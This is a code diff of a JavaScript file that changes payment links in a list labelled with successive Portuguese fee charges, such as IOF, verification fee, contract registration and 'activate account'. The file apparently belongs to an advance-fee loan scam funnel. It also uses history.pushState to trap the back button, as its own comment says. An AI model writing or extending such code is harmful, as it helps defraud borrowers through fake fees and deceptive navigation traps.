@@ -1,8 +1,8 @@
 const baseLinks = {
-    up1: "https://go.sharkpayments.com.br/aoy4en1fgy", // IOF
-    up2: "https://go.sharkpayments.com.br/tu27rzm4zp", // Taxa de verificação de IOF
-    up3: "https://go.sharkpayments.com.br/wjotszd7no", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://go.sharkpayments.com.br/peewbobaok", // NFe
+    up1: "https://superddup1.lovable.app", // IOF
+    up2: "https://superddup2.lovable.app", // Taxa de verificação de IOF
+    up3: "https://superaddup3.lovable.app", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://superaddup4.lovable.app", // NFe
     up5: "https://go.sharkpayments.com.br/ci2ublzw4u", // Ativar conta
     up6: "https://go.sharkpayments.com.br/kbuyi328ce", // Taxa de registro do contrato
     up7: "https://go.sharkpayments.com.br/c9gu2kika1", // Parabéns, 20k adicional
@@ -34,5 +34,6 @@ function redirect(key) {
 // Adiciona duas entradas no histórico para capturar a navegação para trás
 history.pushState({}, '', location.href);
 history.pushState({}, '', location.href);
+
 
 
